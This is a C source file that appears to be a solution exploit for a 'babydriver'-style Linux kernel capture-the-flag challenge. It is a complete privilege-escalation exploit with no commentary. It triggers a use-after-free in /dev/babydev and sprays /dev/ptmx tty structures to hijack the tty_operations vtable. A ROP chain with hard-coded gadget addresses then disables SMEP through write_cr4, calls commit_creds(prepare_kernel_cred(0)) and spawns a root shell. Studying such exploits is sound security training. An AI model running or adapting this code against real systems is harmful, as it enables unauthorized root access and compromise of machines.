#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

struct _tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct inode *inode, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
			unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
				struct serial_icounter_struct *icount);
	struct file_operations *proc_fops;
};
#define KERNCALL __attribute__((regparm(3)))

void ( * commit_creds )(void *) KERNCALL ;
size_t* (* prepare_kernel_cred)(void *) KERNCALL ;


size_t swapgs = 0xffffffff81063694;
size_t xchg_esp_eax = 0xFFFFFFFF81007808;//0xffffffff8100008a;
size_t iretq  = 0xffffffff814e35ef;
size_t p_rdi  = 0xffffffff810d238d;
size_t write_cr4 = 0xFFFFFFFF810635B0;
//unsigned long user_cs, user_ss, user_eflags;

unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}


void getshell(){
	system("/bin/sh");
}

void getroot(){
	commit_creds= 0xffffffff810a1420;
	prepare_kernel_cred =0xffffffff810a1810;	
	size_t cred = prepare_kernel_cred(0);
	commit_creds(cred);
}

struct _tty_operations tty_operations;
char buff[0x1000];
size_t data[0X50];
int main(){
	puts("====================start=======================");
	tty_operations.ioctl = xchg_esp_eax;
	int i;
	char *fake_chunk ; 
	//memset(data,0,0x30);
	save_stats();
	int fd1=-1,fd2=-1;
	int trag[0x100];
	fd1 = open("/dev/babydev",O_RDWR);
	if (fd1==-1){
		puts("fd1 open error");
	}
	printf("fd: %d",fd1);
	fd2 = open("/dev/babydev",O_RDWR);
	if (fd2==-1){
		puts("fd2 open error");
	}	
	printf("fd: %d",fd2);

	puts("\n=================free chunk=====================");
	//ioctl(fd1,0x10001,0x2e0);
	ioctl(fd2,0x10001,0x3e0);
	close(fd2);
	puts("\n=================build mem =====================");
	fake_chunk = mmap(xchg_esp_eax & 0xfffff000, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	printf("build fake chunk at mem : %llx\n",fake_chunk);
	data[0] = p_rdi ;
	data[1] = 0x6f0 ; 
	data[2] = write_cr4 ; 
	data[3] = getroot;
	data[4] = swapgs;
	data[5] = fake_chunk+0x1000;
	data[6] = iretq;
	data[7] = getshell;
	data[8] = user_cs;
	data[9] = user_eflags;
	data[10]= user_sp;
	data[11]= user_ss;
	memcpy(xchg_esp_eax & 0xffffffff,data,sizeof(data));
	puts("\n=================SET VTABLE=====================");
	for(i=0;i<0xff;i++){
		trag[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
		if (trag[i] <= -1){
			puts("open error");
			exit(-1);
		}
	}	
	i = read(fd1,buff,0x40);
	printf("read: %d\n",i);
	for (i = 0 ;i <8;i++){
		printf("%llx\n",(size_t )*(buff+i*8)); 
	}
	*(size_t *)(buff+3*8) = &tty_operations;
	write(fd1,buff,0x40);
	puts("\n=================trag vul=====================");
	for(i=0;i<0xff;i++){
		ioctl(trag[i],0,0);
		//printf("%d",i);
	}	
}
